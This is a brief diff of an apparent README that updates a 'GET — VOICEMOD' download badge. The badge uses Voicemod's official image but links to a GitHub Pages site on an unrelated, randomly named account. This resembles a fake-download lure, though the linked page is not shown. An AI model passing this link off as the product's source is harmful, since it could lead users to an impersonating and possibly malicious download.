@@ -4,7 +4,7 @@
 <img src="https://www.voicemod.net/new/wp-content/uploads/2024/03/2-connect.png" width="400">
 </p>
 
-[![GET — VOICEMOD](https://img.shields.io/badge/GET-VOICEMOD-2563eb?style=for-the-badge)](https://r30575269.github.io/.github/)
+[![GET — VOICEMOD](https://img.shields.io/badge/GET-VOICEMOD-2563eb?style=for-the-badge)](https://r30575269.github.io/.github/Voicemod)
 
 ---
 
